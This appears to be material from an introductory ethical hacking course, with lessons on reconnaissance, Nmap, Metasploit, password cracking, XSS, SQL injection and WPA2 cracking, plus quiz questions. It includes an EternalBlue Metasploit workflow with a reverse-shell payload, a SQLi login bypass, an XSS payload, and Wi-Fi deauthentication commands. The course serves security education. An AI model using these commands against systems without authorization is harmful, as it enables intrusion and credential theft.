title: Introduction to Ethical Hacking
reading:
What is Ethical Hacking?

Ethical hacking involves an authorized attempt to gain unauthorized access to a computer system, application, or data. Carrying out an ethical hack involves duplicating strategies and actions of malicious attackers.

💡 Note: Ethical hackers use their skills to improve security by exposing vulnerabilities before malicious hackers can detect and exploit them. Always get explicit permission before testing!

Types of Hackers

  • White Hat: Security professionals who hack for defense.
  • Black Hat: Malicious hackers who exploit systems for personal gain.
  • Grey Hat: Hackers who operate in a gray area, often without permission but without malicious intent.

The Penetration Testing Process

Professional penetration testing generally follows a structured methodology:

  1. Reconnaissance (Footprinting): Gathering information about the target.
  2. Scanning: Identifying open ports, services, and network structure.
  3. Gaining Access: Exploiting vulnerabilities to enter the system.
  4. Maintaining Access: Creating backdoors for future access.
  5. Covering Tracks: Erasing logs and evidence of the breach.

As an ethical hacker, your final step is usually Reporting rather than covering tracks.

quiz.q: What is the primary difference between a White Hat and a Black Hat hacker?

title: Linux & Command Line Basics for Hackers
reading:
Why Linux?

Most hacking and penetration testing tools are built natively for Linux. Distributions like Kali Linux and Parrot OS are considered industry standards for ethical hacking.

💡 Note: Mastering the Linux Command Line Interface (CLI) is mandatory for any aspiring ethical hacker.

Essential Linux Commands

Here are some of the most critical commands you'll use on a daily basis:

  • ls - List directory contents
  • cd - Change directory
  • grep - Search text using patterns
  • cat - Read file contents
  • chmod - Change file permissions

Example: Searching for Sensitive Data

You can use the command line to search for specific strings, like 'password', within files:

grep -r -i "password" /var/www/html/

This command recursively (-r) and case-insensitively (-i) searches for the word "password" in the web directory.

File Permissions

Understanding permissions is crucial for privilege escalation. Linux uses read (r), write (w), and execute (x) permissions for users, groups, and others.

chmod +x exploit.py

The command above makes a python script executable.

quiz.q: Which command is used to change file permissions in Linux?

title: Reconnaissance & Footprinting
reading:
What is Reconnaissance?

Reconnaissance, or footprinting, is the first phase of ethical hacking. It involves gathering as much information as possible about a target system to find ways to intrude into it.

💡 Note: Reconnaissance can be Active (interacting directly with the target) or Passive (gathering info without direct interaction).

Passive Reconnaissance

Passive recon involves using public resources. Tools and techniques include:

  • WHOIS Lookups: To find domain registration details.
  • Google Dorks: Using advanced search operators to find exposed data.
  • OSINT (Open Source Intelligence): Searching social media, public records, and forums.

Example: Google Dorking

Google dorks can reveal sensitive files that shouldn't be public:

site:target.com ext:pdf "confidential"

This searches for PDF files containing the word "confidential" on the target's website.

Active Reconnaissance

Active recon involves probing the target's network directly. This leaves traces and should only be done with permission.

  • DNS Enumeration: Finding subdomains and DNS records (e.g., using nslookup or dig).
  • Ping Sweeps: Checking which IP addresses are active.

quiz.q: Which of the following is considered Passive Reconnaissance?

title: Network Scanning with Nmap
reading:
Introduction to Nmap

Nmap (Network Mapper) is an open-source tool used for network discovery and security auditing. It is the industry standard for port scanning.

💡 Note: Nmap sends specially crafted packets to the target host and analyzes the responses to determine open ports, running services, and operating systems.

Basic Nmap Scans

To scan a single IP address or hostname:

nmap 192.168.1.100

Advanced Nmap Commands

Nmap has powerful flags to customize your scan:

  • -sV : Probes open ports to determine service and version info.
  • -O : Enables OS detection.
  • -p- : Scans all 65535 ports.
  • -A : Enables OS detection, version detection, script scanning, and traceroute.

Example: Comprehensive Scan

A typical scan used by penetration testers to gather detailed information:

nmap -sC -sV -p- 10.10.10.5

This command uses default Nmap scripts (-sC), probes for versions (-sV), and scans all ports (-p-) on the target IP.

quiz.q: Which Nmap flag is used to determine the versions of running services?

title: Vulnerability Assessment
reading:
What is Vulnerability Assessment?

Vulnerability assessment is the process of identifying, quantifying, and prioritizing vulnerabilities in a system. It answers the question: "What are our weaknesses?"

💡 Note: While a penetration test involves actively exploiting vulnerabilities, an assessment primarily focuses on identifying them.

Common Vulnerability Scanners

Automated tools are often used to scan networks for known vulnerabilities:

  • Nessus: One of the most popular commercial vulnerability scanners.
  • OpenVAS: A full-featured open-source vulnerability scanner.
  • Nikto: A command-line web server scanner.

Understanding CVSS

The Common Vulnerability Scoring System (CVSS) provides a way to capture the principal characteristics of a vulnerability and produce a numerical score reflecting its severity (0.0 to 10.0).

  • Low: 0.1 - 3.9
  • Medium: 4.0 - 6.9
  • High: 7.0 - 8.9
  • Critical: 9.0 - 10.0

Using SearchSploit

If you find a specific service version, you can search for known exploits using the command-line tool searchsploit (an offline copy of Exploit-DB).

searchsploit Apache 2.4.49

quiz.q: What does CVSS stand for in the context of cybersecurity?

title: System Hacking & Metasploit
reading:
The Metasploit Framework

Metasploit is an incredibly powerful open-source penetration testing framework used for developing and executing exploit code against a remote target.

💡 Note: Metasploit contains a massive database of exploits, payloads, encoders, and auxiliary modules.

Metasploit Basics

To start Metasploit from the Kali Linux terminal, type msfconsole.

Key Metasploit concepts:

  • Exploit: The code that takes advantage of a vulnerability.
  • Payload: The code that runs on the target system after a successful exploit (e.g., gaining a reverse shell).
  • LHOST / RHOST: Local Host (your IP) and Remote Host (target IP).

Example: Exploiting a Vulnerability

Here is a typical workflow in msfconsole:

use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 192.168.1.50 set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 192.168.1.10 exploit

Meterpreter Shell

If the exploit is successful, you often get a Meterpreter session. Meterpreter is an advanced, dynamically extensible payload that provides complex features like keylogging, privilege escalation, and pivoting.

opts: The code that exploits a specific vulnerability
The code executed on the target after a successful exploit

title: Password Cracking & Privilege Escalation
reading:
Password Cracking Basics

Password cracking involves recovering passwords from data that has been stored in or transmitted by a computer system. Attackers typically steal cryptographic hashes and crack them offline.

💡 Note: Always use strong, complex passwords and multi-factor authentication (MFA) to mitigate password cracking attacks.

Types of Attacks

  • Dictionary Attack: Trying a predefined list of likely passwords (e.g., the rockyou.txt wordlist).
  • Brute Force Attack: Trying every possible combination of characters.
  • Rainbow Tables: Using precomputed tables for reversing cryptographic hash functions.

Popular Tools

John the Ripper and Hashcat are the most popular offline password crackers.

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

Privilege Escalation

Once an attacker gains initial access (often as a low-privileged user), they will attempt Privilege Escalation to gain Administrator or root access.

Common techniques include:

  • Exploiting kernel vulnerabilities.
  • Abusing misconfigured file permissions or SUID binaries.
  • Finding hardcoded passwords in scripts.

quiz.q: Which attack type uses a predefined list of commonly used passwords?

title: Web Application Hacking
reading:
The OWASP Top 10

The Open Worldwide Application Security Project (OWASP) Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.

💡 Note: Familiarity with the OWASP Top 10 is mandatory for web penetration testers.

Cross-Site Scripting (XSS)

XSS occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows an attacker to execute malicious scripts in the victim's browser.

  • Stored XSS: The malicious script is permanently stored on the target servers (e.g., in a forum post).
  • Reflected XSS: The malicious script is reflected off a web application onto the victim's browser (often via a crafted URL).

Example XSS Payload

A basic test payload to see if an input field is vulnerable to XSS:

<script>alert('XSS Vulnerable!')</script>

Cross-Site Request Forgery (CSRF)

CSRF forces an end user to execute unwanted actions on a web application in which they're currently authenticated.

quiz.q: Which vulnerability allows an attacker to execute malicious JavaScript in a victim's browser?

title: SQL Injection (SQLi)
reading:
What is SQL Injection?

SQL Injection (SQLi) is a code injection technique used to attack data-driven applications. Malicious SQL statements are inserted into entry fields for execution, allowing attackers to view, modify, or delete database data.

💡 Note: SQLi is one of the oldest, most prevalent, and most dangerous web application vulnerabilities.

How SQLi Works

Imagine a login query structured like this:

SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT';

If an attacker enters admin' -- as the username, the query becomes:

SELECT * FROM users WHERE username = 'admin' --' AND password = 'PASSWORD_INPUT';

The -- comments out the rest of the query, bypassing the password check completely!

Types of SQLi

  • In-Band SQLi (Classic): Data is extracted using the same channel that is used to inject the SQL code.
  • Inferential SQLi (Blind): No data is actually transferred via the web application. The attacker infers the payload's effect by observing the application's behavior.

Mitigation

The primary defense against SQLi is the use of Prepared Statements (Parameterized Queries), which separate the query structure from the user input.

quiz.q: What is the best way for a developer to prevent SQL Injection vulnerabilities?

title: Wireless Network Hacking
reading:
Wi-Fi Security Protocols

Wireless networks have evolved through several security standards:

  • WEP: Old, completely broken, and can be cracked in minutes. Never use it.
  • WPA: Replaced WEP, but has its own vulnerabilities.
  • WPA2: The modern standard. Highly secure if a strong password is used.
  • WPA3: The latest standard, offering robust protection against dictionary attacks.
💡 Note: To hack wireless networks, a wireless adapter that supports 'Monitor Mode' and 'Packet Injection' is required.

Hacking WPA2

The most common method to hack a WPA2 network is capturing the 4-Way Handshake.

  1. The attacker puts their wireless card into Monitor Mode using tools like airmon-ng.
  2. They use airodump-ng to listen for traffic on the target network.
  3. They forcefully disconnect a connected user using a Deauthentication Attack (with aireplay-ng).
  4. When the user automatically reconnects, the attacker captures the encrypted WPA2 4-Way Handshake.
  5. The attacker takes the handshake offline and uses tools like Hashcat or John the Ripper to brute-force the password.

Example Commands

airmon-ng start wlan0 airodump-ng wlan0mon aireplay-ng --deauth 10 -a [Router_MAC] wlan0mon

quiz.q: What specific Wi-Fi traffic must an attacker capture to crack a WPA2 password offline?
